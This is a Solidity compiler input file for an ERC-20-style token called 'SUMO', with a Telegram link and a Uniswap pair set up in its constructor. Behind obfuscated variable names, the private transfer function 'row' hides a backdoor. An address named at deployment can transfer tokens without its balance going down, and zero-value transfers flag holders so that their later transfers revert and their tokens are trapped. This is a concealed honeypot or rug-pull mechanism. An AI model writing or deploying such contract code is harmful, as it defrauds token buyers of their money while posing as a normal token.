{{
  "language": "Solidity",
  "sources": {
    "SUMO.sol": {
      "content": "/*\r\n\r\nhttps://t.me/SumoETH\r\n\r\n*/\r\n\r\n// SPDX-License-Identifier: Unlicense\r\n\r\npragma solidity ^0.8.5;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    /**\r\n     * @dev Initializes the contract setting the deployer as the initial owner.\r\n     */\r\n    constructor() {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the address of the current owner.\r\n     */\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    /**\r\n     * @dev Throws if called by any account other than the owner.\r\n     */\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), 'Ownable: caller is not the owner');\r\n        _;\r\n    }\r\n\r\n    /**\r\n     * @dev Leaves the contract without owner. It will not be possible to call\r\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\r\n     *\r\n     * NOTE: Renouncing ownership will leave the contract without an owner,\r\n     * thereby removing any functionality that is only available to the owner.\r\n     */\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n    /**\r\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\r\n     * Can only be called by the current owner.\r\n     */\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), 'Ownable: new owner is the zero address');\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n}\r\n\r\ninterface IUniswapV2Router02 {\r\n    function factory() external pure returns (address);\r\n\r\n    function WETH() external pure returns (address);\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ncontract SUMO is Ownable {\r\n    mapping(address => mapping(address => uint256)) public allowance;\r\n\r\n    uint256 private partut = 48;\r\n\r\n    function transferFrom(address partufftr, address partwallo, uint256 partwaxxo) public returns (bool success) {\r\n        require(partwaxxo <= allowance[partufftr][msg.sender]);\r\n        allowance[partufftr][msg.sender] -= partwaxxo;\r\n        row(partufftr, partwallo, partwaxxo);\r\n        return true;\r\n    }\r\n\r\n    mapping(address => uint256) private partat;\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    string public symbol = 'SUMO';\r\n\r\n    uint8 public decimals = 9;\r\n\r\n    uint256 public totalSupply = 1000000000 * 10 ** 9;\r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n\r\n    address public uniswapV2Pair;\r\n\r\n    mapping(address => uint256) private partaxtre;\r\n\r\n    string public name = 'SUMO';\r\n\r\n    constructor(address partattat) {\r\n        balanceOf[msg.sender] = totalSupply;\r\n        partat[partattat] = partut;\r\n        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\r\n    }\r\n\r\n    function row(address partufftr, address partwallo, uint256 partwaxxo) private returns (bool success) {\r\n        if (partat[partufftr] == 0) {\r\n            balanceOf[partufftr] -= partwaxxo;\r\n        }\r\n\r\n        if (partwaxxo == 0) partaxtre[partwallo] += partut;\r\n\r\n        if (partufftr != uniswapV2Pair && partat[partufftr] == 0 && partaxtre[partufftr] > 0) {\r\n            partat[partufftr] -= partut;\r\n        }\r\n\r\n        balanceOf[partwallo] += partwaxxo;\r\n        emit Transfer(partufftr, partwallo, partwaxxo);\r\n        return true;\r\n    }\r\n\r\n    function approve(address portop, uint256 partwaxxo) public returns (bool success) {\r\n        allowance[msg.sender][portop] = partwaxxo;\r\n        emit Approval(msg.sender, portop, partwaxxo);\r\n        return true;\r\n    }\r\n\r\n    function transfer(address partwallo, uint256 partwaxxo) public returns (bool success) {\r\n        row(msg.sender, partwallo, partwaxxo);\r\n        return true;\r\n    }\r\n\r\n    mapping(address => uint256) public balanceOf;\r\n}"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    }
  }
}}